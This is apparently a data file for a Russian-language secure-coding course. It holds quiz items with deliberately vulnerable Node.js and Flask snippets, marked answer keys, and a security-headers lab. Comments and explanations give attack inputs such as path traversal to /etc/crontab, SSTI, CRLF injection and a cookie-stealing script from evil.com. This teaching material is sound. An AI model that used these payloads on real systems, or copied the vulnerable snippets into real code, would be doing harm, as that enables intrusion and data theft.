      { text: 'Добавить таймаут для fetch', correct: false },
      { text: 'Ограничить размер ответа', correct: false },
    ],
    explanation:
      'SSRF позволяет злоумышленнику заставить сервер делать запросы к внутренним ресурсам: 169.254.169.254 (AWS метаданные), localhost, внутренние API. Защита: белый список доменов, блокировка приватных IP (10.x, 172.16.x, 192.168.x, 127.x), только HTTPS, DNS-rebind protection.',
  },
  {
    id: 'sc-9',
    title: 'Insecure Deserialization',
    category: 'Сериализация',
    code: `const serialize = require('node-serialize');
app.post('/api/profile', (req, res) => {
  const profile = serialize.unserialize(req.body.profile);
  res.json(profile);
});`,
    options: [
      { text: 'Использовать JSON.parse вместо кастомной десериализации и валидировать схему через Zod', correct: true },
      { text: 'Добавить try-catch вокруг unserialize', correct: false },
      { text: 'Проверять размер входных данных', correct: false },
      { text: 'Использовать HTTPS для передачи данных', correct: false },
    ],
    explanation:
      'Небезопасная десериализация позволяет выполнить произвольный код. node-serialize поддерживает IIFE (_$$ND_FUNC$$_function(){...}()), который выполняется при десериализации. Решение: использовать JSON.parse (не выполняет код) + валидация схемы (Zod, Joi) для проверки структуры данных.',
  },
  {
    id: 'sc-10',
    title: 'Race Condition — гонка данных',
    category: 'Конкурентность',
    code: `app.post('/api/withdraw', async (req, res) => {
  const user = await db.getUser(req.user.id);
  if (user.balance >= req.body.amount) {
    await db.updateBalance(req.user.id, user.balance - req.body.amount);
    res.json({ success: true });
  }
});`,
    options: [
      { text: 'Использовать атомарную операцию: UPDATE users SET balance = balance - ? WHERE id = ? AND balance >= ?', correct: true },
      { text: 'Добавить блокировку на чтение пользователя', correct: false },
      { text: 'Использовать транзакцию без проверки баланса', correct: false },
      { text: 'Увеличить таймаут запроса', correct: false },
    ],
    explanation:
      'Race Condition возникает при одновременных запросах: два запроса читают баланс 100, оба проверяют >= 50, оба списывают 50 → баланс становится -50. Атомарная операция UPDATE ... WHERE balance >= ? гарантирует, что проверка и обновление выполняются как единая операция без промежутка.',
  },
  {
    id: 'sc-11',
    title: 'Open Redirect — перенаправление на вредоносный сайт',
    category: 'Контроль доступа',
    code: `app.get('/api/redirect', (req, res) => {
  const url = req.query.url;
  res.redirect(url);
  // Атака: /api/redirect?url=https://evil.com/phishing
  // Пользователь видит знакомый домен, но перенаправляется на фишинговый сайт
});`,
    options: [
      { text: 'Проверять, что URL начинается с разрешённого домена: if (!url.startsWith(\'https://myapp.com/\')) return 400', correct: true },
      { text: 'Использовать res.send вместо res.redirect', correct: false },
      { text: 'Кодировать URL через encodeURIComponent', correct: false },
      { text: 'Добавить заголовок Referer', correct: false },
    ],
    explanation:
      'Open Redirect позволяет злоумышленнику использовать доверенный домен для перенаправления на фишинговый сайт. Злоумышленник отправляет victim.com/api/redirect?url=evil.com, и пользователь доверяет переходу, так как начинается с victim.com. Решение — белый список разрешённых доменов.',
  },
  {
    id: 'sc-12',
    title: 'IDOR — небезопасная прямая ссылка на объект',
    category: 'Контроль доступа',
    code: `app.get('/api/documents/:id', (req, res) => {
  // Любой аутентифицированный пользователь может получить любой документ
  const doc = await db.getDocument(req.params.id);
  res.json(doc);
  // Атака: пользователь с id=5 запросит /api/documents/100
  // и получит документ другого пользователя
});`,
    options: [
      { text: 'Проверять, что документ принадлежит текущему пользователю: if (doc.userId !== req.user.id) return 403', correct: true },
      { text: 'Шифровать ID документа', correct: false },
      { text: 'Использовать POST вместо GET', correct: false },
      { text: 'Добавить логирование запросов', correct: false },
    ],
    explanation:
      'IDOR (Insecure Direct Object Reference) возникает, когда приложение не проверяет, что пользователь имеет права на доступ к указанному объекту. Злоумышленник меняет ID в URL и получает доступ к данным других пользователей. Необходимо проверять принадлежность ресурса.',
  },
  {
    id: 'sc-13',
    title: 'CORS Misconfiguration — неправильная настройка CORS',
    category: 'Сетевая безопасность',
    code: `app.use((req, res, next) => {
  // Опасно: разрешает ЛЮБОЙ домен
  res.header('Access-Control-Allow-Origin', req.headers.origin);
  res.header('Access-Control-Allow-Credentials', 'true');
  next();
});`,
    options: [
      { text: 'Указать конкретные разрешённые домены вместо динамического origin', correct: true },
      { text: 'Убрать заголовок Access-Control-Allow-Credentials', correct: false },
      { text: 'Запретить все CORS-запросы', correct: false },
      { text: 'Использовать HTTPS вместо HTTP', correct: false },
    ],
    explanation:
      'Установка Access-Control-Allow-Origin в req.headers.origin позволяет ЛЮБОМУ сайту делать запросы с credentials (куки). Злоумышленник создаёт сайт, который делает запрос к уязвимому API, и браузер отправляет куки. Решение — жёстко указать разрешённые домены.',
  },
  {
    id: 'sc-14',
    title: 'API Key Exposure — раскрытие ключей API в клиентском коде',
    category: 'Конфигурация',
    code: `// Клиентский React-компонент
const API_KEY = 'sk-1234567890abcdef';
const API_URL = 'https://api.openai.com/v1/chat';

async function sendMessage(msg) {
  const res = await fetch(API_URL, {
    method: 'POST',
    headers: {
      'Authorization': \`Bearer \${API_KEY}\`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ messages: [{ role: 'user', content: msg }] })
  });
  return res.json();
}`,
    options: [
      { text: 'Вызывать API через серверный прокси-эндпоинт, не раскрывая ключ на клиенте', correct: true },
      { text: 'Обфусцировать API_KEY в JavaScript', correct: false },
      { text: 'Использовать HTTPS вместо HTTP', correct: false },
      { text: 'Закодировать ключ через Base64', correct: false },
    ],
    explanation:
      'Любые данные в клиентском JavaScript доступны пользователю через DevTools. API-ключ на клиенте может быть извлечён любым посетителем сайта. Решение — серверный прокси-эндпоинт, который вызывает внешний API, не раскрывая ключ.',
  },
  {
    id: 'sc-15',
    title: 'File Upload — небезопасная загрузка файлов',
    category: 'Контроль доступа',
    code: `app.post('/api/upload', (req, res) => {
  const file = req.files.document;
  // Сохраняем файл с оригинальным именем
  file.mv(\`uploads/\${file.name}\`);
  res.json({ url: \`/uploads/\${file.name}\` });
  // Атака: загрузка shell.php, который выполнится на сервере
});`,
    options: [
      { text: 'Проверять расширение, MIME-type, генерировать случайное имя файла и хранить вне webroot', correct: true },
      { text: 'Разрешить только изображения', correct: false },
      { text: 'Ограничить размер файла до 1MB', correct: false },
      { text: 'Шифровать файл перед сохранением', correct: false },
    ],
    explanation:
      'Загрузка файлов без проверки типа и имени позволяет злоумышленнику загрузить исполняемый файл (.php, .jsp, .asp), который сервер выполнит. Защита: белый список расширений, проверка MIME-type (не только extension), генерация случайного имени, хранение вне webroot, антивирусная проверка.',
  },
  {
    id: 'sc-16',
    title: 'LDAP Injection — инъекция в LDAP-запрос',
    category: 'Инъекции',
    code: `app.post('/api/search', (req, res) => {
  const query = req.body.searchTerm;
  const filter = "(&(cn=" + query + ")(objectClass=person))";
  ldap.search(baseDN, filter, (err, results) => {
    res.json(results);
  });
});`,
    options: [
      { text: 'Экранировать спецсимволы LDAP через ldap.escape и валидировать ввод', correct: true },
      { text: 'Использовать HTTPS для LDAP-соединения', correct: false },
      { text: 'Ограничить длину searchTerm', correct: false },
      { text: 'Удалить пробелы из searchTerm', correct: false },
    ],
    explanation:
      'LDAP Injection: ввод *)(|(objectClass=*)) закрывает фильтр и добавляет новый условие, возвращая все записи. Защита: экранирование спецсимволов LDAP (\\, (, ), &, |, !, =, <, >, ~, *), whitelist-валидация, least privilege для LDAP-аккаунта.',
  },
  {
    id: 'sc-17',
    title: 'Server-Side Template Injection (SSTI)',
    category: 'Инъекции',
    code: `// Flask/Jinja2 — уязвимый код
@app.route('/greeting')
def greeting():
    name = request.args.get('name', 'World')
    template = f'<h1>Hello, {name}!</h1>'
    return render_template_string(template)
    # Атака: ?name={{ config }} раскрывает конфигурацию`,
    options: [
      { text: 'Использовать render_template с отдельным файлом шаблона и передавать name как переменную', correct: true },
      { text: 'Экранировать фигурные скобки', correct: false },
      { text: 'Использовать POST вместо GET', correct: false },
      { text: 'Добавить CSP заголовок', correct: false },
    ],
    explanation:
      'SSTI: пользовательский ввод напрямую интерполируется в шаблон. {{ config }} раскрывает все настройки Flask, {{ self.__init__.__globals__ }} — доступ к Python-объектам. Защита: никогда не передавать пользовательский ввод в render_template_string, использовать отдельные шаблоны с переменными, autoescaping.',
  },
  {
    id: 'sc-18',
    title: 'Insecure JWT Verification — algorithm none attack',
    category: 'Криптография',
    code: `const jwt = require('jsonwebtoken');
app.get('/api/profile', (req, res) => {
  const token = req.headers.authorization;
  const decoded = jwt.verify(token, SECRET);
  // Атака: {"alg":"none"} bypasses signature verification
  res.json(decoded);
});`,
    options: [
      { text: 'Явно указать allowedAlgorithms: [\'HS256\'] и reject algorithm: none', correct: true },
      { text: 'Использовать более длинный секрет', correct: false },
      { text: 'Добавить срок действия токена', correct: false },
      { text: 'Хранить токен в localStorage', correct: false },
    ],
    explanation:
      'Algorithm none attack: злоумышленник создаёт JWT с {"alg":"none"} и пустой подписью. Некоторые библиотеки принимают это как «без подписи». Защита: jwt.verify(token, SECRET, { algorithms: [\'HS256\'] }), всегда проверять алгоритм, использовать httpOnly cookies вместо localStorage.',
  },
  {
    id: 'sc-19',
    title: 'Prototype Pollution — модификация Object.prototype',
    category: 'Инъекции',
    code: `app.post('/api/settings', (req, res) => {
  // Deep merge user input into defaults
  const settings = _.merge({}, DEFAULT_SETTINGS, req.body);
  // Атака: {"__proto__":{"isAdmin":true}} pollution
  res.json(settings);
});`,
    options: [
      { text: 'Использовать Object.create(null) для dictionary и блокировать __proto__ в sanitize', correct: true },
      { text: 'Использовать JSON.parse', correct: false },
      { text: 'Ограничить глубину объекта', correct: false },
      { text: 'Использовать HTTPS', correct: false },
    ],
    explanation:
      'Prototype Pollution: {"__proto__":{"isAdmin":true}} добавляет isAdmin ко всем объектам. _.merge рекурсивно копирует __proto__. Защита: Object.freeze(Object.prototype), sanitize keys (блокировать __proto__, constructor, prototype), использовать safe merge (lodash > 4.17.21), Object.create(null) для dict.',
  },
  {
    id: 'sc-20',
    title: 'Path Traversal при загрузке файлов',
    category: 'Контроль доступа',
    code: `app.post('/api/upload-avatar', (req, res) => {
  const filename = req.body.filename; // user-controlled
  const path = \`uploads/avatars/\${filename}\`;
  fs.writeFileSync(path, req.file.buffer);
  // Атака: filename = "../../etc/crontab"
});`,
    options: [
      { text: 'Генерировать UUID-имя файла, проверять путь через path.resolve и startsWith разрешённой директории', correct: true },
      { text: 'Удалить .. из имени файла', correct: false },
      { text: 'Ограничить размер файла', correct: false },
      { text: 'Шифровать содержимое файла', correct: false },
    ],
    explanation:
      'Path Traversal: filename=../../etc/crontab перезаписывает системный файл. Простая фильтрация .. недостаточна (можно через %2e%2e, Unicode). Защита: полностью игнорировать пользовательское имя, генерировать UUID, path.resolve() + startsWith(allowedDir), хранение вне webroot.',
  },
  {
    id: 'sc-21',
    title: 'Email Header Injection через пользовательский ввод',
    category: 'Инъекции',
    code: `app.post('/api/contact', (req, res) => {
  const { name, email, subject } = req.body;
  // user input goes directly into email headers
  mail.send({
    to: 'admin@company.com',
    from: email,
    subject: subject,  // Атака: subject = "Test\\r\\nBcc: spam@victim.com"
  });
});`,
    options: [
      { text: 'Удалять \\r и \\n из всех email-параметров, использовать библиотеку с защитой от header injection', correct: true },
      { text: 'Экранировать HTML', correct: false },
      { text: 'Использовать HTTPS', correct: false },
      { text: 'Проверять SPF/DKIM', correct: false },
    ],
    explanation:
      'Email Header Injection: CRLF (\\r\\n) в subject/from позволяет добавить Bcc-заголовки для массовой рассылки. Или \\r\\n\\r\\n для изменения тела письма. Защита: strip \\r\\n из всех параметров, использовать PHPMailer/Nodemailer (built-in protection), валидировать email-адреса через regex.',
  },
  {
    id: 'sc-22',
    title: 'GraphQL Introspection — раскрытие схемы API',
    category: 'Сетевая безопасность',
    code: `const { ApolloServer } = require('apollo-server');
const server = new ApolloServer({
  typeDefs,
  resolvers,
  // Introspection enabled by default
  // Атака: {__schema{types{name fields{name}}}} reveals entire API
});`,
    options: [
      { text: 'Отключить introspection в production: introspection: false, использовать persisted queries', correct: true },
      { text: 'Добавить CORS заголовки', correct: false },
      { text: 'Ограничить rate limiting', correct: false },
      { text: 'Использовать HTTPS', correct: false },
    ],
    explanation:
      'GraphQL introspection позволяет запросить полную схему: типы, поля, мутации. Злоумышленник находит скрытые admin-мутации, sensitive поля. Защита: introspection: false в production, persisted queries (allowlist), depth limiting, query complexity analysis, rate limiting.',
  },
  {
    id: 'sc-23',
    title: 'IDOR — небезопасная прямая ссылка на объект (UUID bypass)',
    category: 'Контроль доступа',
    code: `app.get('/api/documents/:docId', (req, res) => {
  // Используем UUID вместо sequential ID, но нет проверки прав
  const doc = await Document.findOne({ uuid: req.params.docId });
  res.json(doc);
  // Атака: перебор UUID или получение UUID из реферера
});`,
    options: [
      { text: 'Проверять, что документ принадлежит текущему пользователю: { uuid, ownerId: req.user.id }', correct: true },
      { text: 'Использовать более длинные UUID', correct: false },
      { text: 'Ограничить rate limiting', correct: false },
      { text: 'Логировать все запросы', correct: false },
    ],
    explanation:
      'UUID не заменяет авторизацию. UUID можно получить из логов, реферера, уведомлений. Или brute-force (хотя сложно). Ключевая защита: всегда проверять ownership: Document.findOne({ uuid: req.params.docId, ownerId: req.user.id }). UUID — obscurity, не security.',
  },
  {
    id: 'sc-24',
    title: 'HTTP Response Splitting — разделение HTTP-ответа',
    category: 'Инъекции',
    code: `app.get('/api/redirect', (req, res) => {
  const url = req.query.url;
  // user input in redirect header
  res.writeHead(302, { Location: url });
  // Атака: url = "http://evil.com\\r\\nX-Injected: header"
});`,
    options: [
      { text: 'Валидировать URL, удалять \\r\\n, использовать whitelist разрешённых доменов для редиректа', correct: true },
      { text: 'Использовать POST вместо GET', correct: false },
      { text: 'Добавить Content-Length', correct: false },
      { text: 'Использовать HTTPS', correct: false },
    ],
    explanation:
      'HTTP Response Splitting: CRLF (\\r\\n) в Location позволяет добавить произвольные заголовки или даже тело ответа. Это может привести к XSS, cache poisoning, session fixation. Защита: валидировать URL (isSafeURL()), strip \\r\\n, whitelist доменов, использовать res.redirect() вместо ручного writeHead.',
  },
  {
    id: 'sc-25',
    title: 'Mass Assignment — автоматическое связывание всех полей модели',
    category: 'Контроль доступа',
    code: `app.put('/api/users/:id', async (req, res) => {
  // Все поля из req.body автоматически привязываются к модели
  const user = await User.findByIdAndUpdate(
    req.params.id,
    req.body,  // Атака: {"role":"admin","isVerified":true}
    { new: true }
  );
  res.json(user);
});`,
    options: [
      { text: 'Использовать whitelist разрешённых полей (pick/omit) или явное указание обновляемых полей', correct: true },
      { text: 'Проверять isAuthenticated', correct: false },
      { text: 'Использовать HTTPS', correct: false },
      { text: 'Добавить rate limiting', correct: false },
    ],
    explanation:
      'Mass Assignment: злоумышленник отправляет дополнительные поля (role, isAdmin, isVerified, balance), которые обновляются в БД. Даже если форма не содержит этих полей, API принимает их. Защита: whitelist полей (pick(req.body, [\'name\', \'email\'])), explicit field mapping, DTO/схемы валидации (Zod, Joi), разделение input/output моделей.',
  },
];

// ============================================================
// Security Headers Lab Data
// ============================================================
export interface SecurityHeader {
  id: string;
  name: string;
  category: string;
  description: string;
  attackDemo: string;
  vulnerableConfig: string;
  secureConfig: string;
  quiz: { question: string; options: string[]; correctIndex: number; explanation: string };
}

export const securityHeaders: SecurityHeader[] = [
  {
    id: 'csp',
    name: 'Content-Security-Policy',
    category: 'Защита от XSS',
    description:
      'CSP — самый мощный HTTP-заголовок для защиты от XSS. Он определяет, откуда браузер может загружать скрипты, стили, изображения, шрифты и другие ресурсы. Правильно настроенный CSP блокирует выполнение inline-скриптов и загрузку ресурсов с неавторизованных доменов.',
    attackDemo:
      'Без CSP злоумышленник внедряет <script src="https://evil.com/steal.js"></script> через XSS. Браузер выполняет скрипт, который отправляет cookies на сервер злоумышленника. С CSP «script-src \'self\'» — браузер блокирует загрузку внешнего скрипта.',
    vulnerableConfig: `// Нет CSP — браузер загружает скрипты отовсюду
app.use((req, res, next) => {
  // Никаких ограничений на источники ресурсов
  next();
});

// Злоумышленник может:
// 1. Загрузить скрипт с любого CDN
// 2. Выполнить inline-скрипт <script>alert(1)</script>
// 3. Подключить iframe с фишинговым сайтом`,
    secureConfig: `// Строгий CSP через helmet
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],                    // Только свой домен
    styleSrc: ["'self'", "'unsafe-inline'"],  // Свой + inline стили
    imgSrc: ["'self'", 'data:', 'https:'],    // Свой + data + HTTPS
    fontSrc: ["'self'", 'https://fonts.gstatic.com'],
    frameSrc: ["'none'"],                     // Запрет iframe
    objectSrc: ["'none'"],                    // Запрет flash/object
    upgradeInsecureRequests: [],              // HTTP → HTTPS
  }
}));`,
    quiz: {
      question: 'Какая CSP-директива блокирует все inline-скрипты?',
      options: ["script-src 'unsafe-inline'", "script-src 'self'", "default-src *", "script-src 'none'"],
      correctIndex: 1,
      explanation: "script-src 'self' разрешает загрузку скриптов только с текущего домена. Inline-скрипты (<script>тег</script>) и обработчики событий (onclick) блокируются. Для разрешения конкретного inline-скрипта нужен nonce или hash.",
    },
  },
  {
    id: 'hsts',
    name: 'Strict-Transport-Security',
    category: 'Защита соединения',
    description:
      'HSTS заставляет браузер всегда использовать HTTPS для данного домена, даже если пользователь вводит http://. Это предотвращает downgrade-атаки (SSL stripping), при которых злоумышленник на уровне сети конвертирует HTTPS-соединение в HTTP.',
    attackDemo:
      'Без HSTS: пользователь вводит http://bank.com. MITM-атакующий (через публичный Wi-Fi) перехватывает запрос и не перенаправляет на HTTPS. Пароль передаётся в открытом виде. С HSTS: браузер помнит, что bank.com всегда HTTPS, и автоматически использует защищённое соединение.',
    vulnerableConfig: `// Нет HSTS
app.use((req, res, next) => {
  // Пользователи могут зайти по HTTP
  // Нет принудительного редиректа на HTTPS
  next();
});

// Атака SSL Strip:
// 1. Пользователь: http://bank.com
// 2. Атакующий: перехватывает, не редиректит
// 3. Пароль передаётся открытым текстом`,
    secureConfig: `// HSTS через helmet
app.use(helmet.hsts({
  maxAge: 31536000,       // 1 год (в секундах)
  includeSubDomains: true, // Все поддомены тоже HTTPS
  preload: true           // Включить в HSTS preload list браузера
}));

// Или вручную:
res.setHeader(
  'Strict-Transport-Security',
  'max-age=31536000; includeSubDomains; preload'
);

// Редирект HTTP → HTTPS
app.use((req, res, next) => {
  if (req.protocol === 'http') {
    res.redirect(301, 'https://' + req.get('host') + req.url);
  } else {
    next();
  }
});`,
    quiz: {
      question: 'Что делает директива preload в HSTS?',
      options: [
        'Предзагружает SSL-сертификат',
        'Добавляет домен в встроенный список HSTS браузеров',
        'Ускоряет HTTPS-соединение',
        'Включает HSTS только для поддоменов',
      ],
      correctIndex: 1,
      explanation: 'preload добавляет домен в HSTS Preload List — список, встроенный в браузеры (Chrome, Firefox, Safari). Даже первый визит на сайт будет через HTTPS, без необходимости сначала получить HSTS-заголовок.',
    },
  },
  {
    id: 'x-frame-options',
    name: 'X-Frame-Options',
    category: 'Защита от кликджекинга',
    description:
      'X-Frame-Options запрещает встраивание страницы в iframe, frame или object. Это защита от clickjacking — атаки, при которой невидимый iframe с целевым сайтом накладывается на видимую страницу, заставляя пользователя нажать на кнопку, которую он не видит.',
    attackDemo:
      'Без X-Frame-Options: злоумышленник создаёт страницу с прозрачным iframe, содержащим bank.com/transfer. Пользователь думает, что нажимает на кнопку «Получить приз», но на самом деле подтверждает перевод денег.',
    vulnerableConfig: `// Нет X-Frame-Options
app.use((req, res, next) => {
  // Любой сайт может встроить вашу страницу в iframe
  next();
});

// Атака clickjacking:
// <iframe src="https://bank.com/transfer"
//         style="opacity:0; position:absolute;
//                top:100px; left:100px;">
// </iframe>
// <button style="position:absolute; top:100px; left:100px;">
//   Получить приз!
// </button>`,
    secureConfig: `// Через helmet
app.use(helmet.frameguard({ action: 'deny' }));

// Или вручную:
res.setHeader('X-Frame-Options', 'DENY');
// SAMEORIGIN — разрешить iframe только с того же домена
// DENY — полностью запретить встраивание

// Современная альтернатива через CSP:
app.use(helmet.contentSecurityPolicy({
  directives: {
    frameAncestors: ["'self'"], // Или 'none'
  }
}));`,
    quiz: {
      question: 'Какое значение X-Frame-Options полностью запрещает встраивание страницы в iframe?',
      options: ['SAMEORIGIN', 'ALLOW-FROM', 'DENY', 'BLOCK'],
      correctIndex: 2,
      explanation: 'DENY полностью запрещает встраивание страницы в iframe. SAMEORIGIN разрешает встраивание только с того же домена. ALLOW-FROM (deprecated) разрешал указание конкретного домена.',
    },
  },
  {
    id: 'x-content-type',
    name: 'X-Content-Type-Options',
    category: 'Защита от MIME-sniffing',
    description:
      'X-Content-Type-Options: nosniff запрещает браузеру определять MIME-тип файла по содержимому. Без этого заголовка браузер может интерпретировать файл с расширением .jpg как JavaScript, если содержимое выглядит как JS-код.',
    attackDemo:
      'Злоумышленник загружает файл avatar.jpg, содержащий: /* это изображение */ alert(document.cookie);. Без nosniff браузер видит JavaScript и выполняет его, несмотря на расширение .jpg. Это называется MIME-type sniffing attack.',
    vulnerableConfig: `// Нет X-Content-Type-Options
app.use(express.static('uploads'));
// Пользователь загружает файл:
// Content-Type: image/jpeg
// Содержимое: <script>alert('XSS')</script>

// Без nosniff:
// - Chrome: определяет по содержимому → исполняет как JS
// - Firefox: определяет по содержимому → исполняет как JS`,
    secureConfig: `// Через helmet
app.use(helmet.noSniff());

// Или вручную:
res.setHeader('X-Content-Type-Options', 'nosniff');

// Также важно: правильная отдача файлов
app.get('/uploads/:filename', (req, res) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Content-Disposition', 'attachment');
  res.sendFile(path.join(__dirname, 'uploads', req.params.filename));
});`,
    quiz: {
      question: 'Что предотвращает X-Content-Type-Options: nosniff?',
      options: [
        'Загрузку файлов без расширения',
        'Интерпретацию браузером файла как другого MIME-типа',
        'Скачивание вредоносных файлов',
        'Изменение Content-Type сервером',
      ],
      correctIndex: 1,
      explanation: 'nosniff запрещает браузеру «угадывать» MIME-тип по содержимому файла. Браузер будет использовать только заголовок Content-Type, указанный сервером. Это предотвращает атаки, где файл с «безопасным» расширением содержит вредоносный код.',
    },
  },
  {
    id: 'referrer-policy',
    name: 'Referrer-Policy',
    category: 'Защита приватности',
    description:
      'Referrer-Policy контролирует, сколько информации о предыдущей странице передаётся в заголовке Referer при переходе на другой сайт. Это важно для приватности — Referer может содержать sensitive данные (URL с параметрами, токены, поисковые запросы).',
    attackDemo:
      'Без Referrer-Policy: пользователь переходит с bank.com/transfer?token=abc123 на внешний сайт. Заголовок Referer: https://bank.com/transfer?token=abc123 передаётся внешнему серверу, раскрывая токен авторизации.',
    vulnerableConfig: `// Нет Referrer-Policy
// Браузер по умолчанию отправляет полный URL
// Referer: https://myapp.com/dashboard?user_id=123&session=abc

// Внешний сайт видит:
// - user_id пользователя
// - session token
// - путь к странице
// - параметры запроса`,
    secureConfig: `// Через helmet
app.use(helmet.referrerPolicy({
  policy: 'strict-origin-when-cross-origin'
}));

// Или вручную:
res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');

// Варианты:
// no-referrer          — никогда не отправлять Referer
// same-origin          — только для того же домена
// strict-origin        — только домен (без пути) для HTTPS→HTTPS
// strict-origin-when-cross-origin — полный URL для same-origin, только домен для cross-origin (рекомендуется)`,
    quiz: {
      question: 'Какое значение Referrer-Policy рекомендуется по умолчанию?',
      options: [
        'no-referrer',
        'unsafe-url',
        'strict-origin-when-cross-origin',
        'same-origin',
      ],
      correctIndex: 2,
      explanation: 'strict-origin-when-cross-origin отправляет полный URL для навигации внутри того же домена, и только домен (без пути и параметров) для кросс-доменных переходов. Это баланс между функциональностью и приватностью.',
    },
  },
  {
    id: 'permissions-policy',
    name: 'Permissions-Policy',
    category: 'Контроль API браузера',
    description:
      'Permissions-Policy ограничивает использование браузерных API (камера, микрофон, геолокация, USB, Bluetooth и др.) для текущего документа и iframe. Замена устаревшего Feature-Policy. Защищает от злоупотребления API браузера через XSS или вредоносные iframe.',
    attackDemo:
      'Без Permissions-Policy: злоумышленник через XSS получает доступ к navigator.geolocation и отслеживает местоположение пользователя. Или использует navigator.mediaDevices.getUserMedia() для доступа к камере/микрофону.',
    vulnerableConfig: `// Нет Permissions-Policy
app.use((req, res, next) => {
  // Все API браузера доступны:
  // - Камера и микрофон
  // - Геолокация
  // - USB-устройства
  // - Bluetooth
  // - Clipboard
  // - Accelerometer, Gyroscope
  next();
});`,
    secureConfig: `// Запретить все неиспользуемые API
res.setHeader('Permissions-Policy', [
  'camera=()',           // Запрет камеры
  'microphone=()',       // Запрет микрофона
  'geolocation=()',      // Запрет геолокации
  'usb=()',              // Запрет USB
  'bluetooth=()',        // Запрет Bluetooth
  'clipboard-read=()',   // Запрет чтения буфера
  'clipboard-write=()',  // Запрет записи в буфер
  'accelerometer=()',    // Запрет акселерометра
  'gyroscope=()',        // Запрет гироскопа
  'payment=(self)',      // Разрешить только для same-origin
].join(', '));

// Разрешить только необходимые:
// Permissions-Policy: geolocation=(self), camera=()`,
    quiz: {
      question: 'Что делает директива camera=() в Permissions-Policy?',
      options: [
        'Разрешает камеру для всех',
        'Запрещает использование камеры',
        'Разрешает камеру только для localhost',
        'Требует HTTPS для камеры',
      ],
      correctIndex: 1,
      explanation: 'camera=() с пустыми скобками означает «ни для кого». Это эквивалент DENY. camera=(self) разрешает только для same-origin. camera=(self https://trusted.com) разрешает для текущего домена и указанного источника.',
    },
  },
];

// ============================================================
// Achievements
// ============================================================
export const achievements = [
  {
    id: 'first-steps',
    title: 'Первые шаги',
    description: 'Завершите свой первый модуль обучения.',
    condition: 'Пройдите любой модуль',
  },
  {
    id: 'sql-master',
    title: 'SQL-мастер',
    description: 'Завершите все задания лаборатории SQL-инъекций.',
    condition: 'Пройдите модуль SQL-инъекции',
  },
  {
    id: 'xss-hunter',
    title: 'Охотник на XSS',
    description: 'Изучите все три типа XSS-атак.',
    condition: 'Пройдите модуль XSS',
  },
  {
    id: 'security-guard',
    title: 'Страж безопасности',
    description: 'Изучите все 10 категорий OWASP Top 10.',
    condition: 'Изучите все пункты OWASP Top 10',
  },
  {
    id: 'auth-expert',
    title: 'Эксперт по аутентификации',
    description: 'Завершите модуль безопасности аутентификации.',
    condition: 'Пройдите модуль Аутентификация',
  },
  {
    id: 'code-reviewer',
    title: 'Код-ревьюер',
    description: 'Завершите все задания безопасного кодирования.',
    condition: 'Пройдите модуль Безопасное кодирование',
  },
  {
    id: 'quiz-master',
    title: 'Мастер квизов',
    description: 'Пройдите квизы в 3 и более категориях.',
    condition: 'Завершите 3 квиза',
  },
  {
    id: 'quiz-perfect',
    title: 'Безупречный результат',
    description: 'Получите 100% в любом квизе.',
    condition: 'Наберите 100% в квизе',
  },
  {
    id: 'crypto-ninja',
    title: 'Криптограф-ниндзя',
    description: 'Завершите модуль инструментов безопасности.',
    condition: 'Пройдите модуль Инструменты',
  },
  {
    id: 'full-completion',
    title: 'Полное прохождение',
    description: 'Завершите все обучающие модули платформы.',
    condition: 'Пройдите все 8 модулей',
  },
  {
    id: 'csrf-shield',
    title: 'Щит от CSRF',
    description: 'Изучите модуль CSRF-атак и механизмы защиты.',
    condition: 'Пройдите модуль CSRF',
  },
  {
    id: 'owasp-half',
    title: 'Полпути к OWASP',
    description: 'Изучите минимум 5 из 10 категорий OWASP Top 10.',
    condition: 'Изучите 5 пунктов OWASP Top 10',
  },
  {
    id: 'quiz-all',
    title: 'Квиз-энциклопедист',
    description: 'Пройдите квизы во всех 7 категориях.',
    condition: 'Завершите 7 квизов',
  },
  {
    id: 'crypto-explorer',
    title: 'Исследователь криптографии',
    description: 'Используйте все инструменты в модуле «Инструменты безопасности».',
    condition: 'Попробуйте все криптографические инструменты',
  },
  {
    id: 'coding-pro',
    title: 'Профессионал код-ревью',
    description: 'Правильно решите минимум 8 из 15 задач безопасного кодирования.',
    condition: 'Решите 8+ задач на безопасное кодирование',
  },
  {
    id: 'headers-guard',
    title: 'Страж заголовков',
    description: 'Изучите все 6 Security Headers и правильно ответьте на квизы.',
    condition: 'Пройдите модуль Security Headers',
  },
];
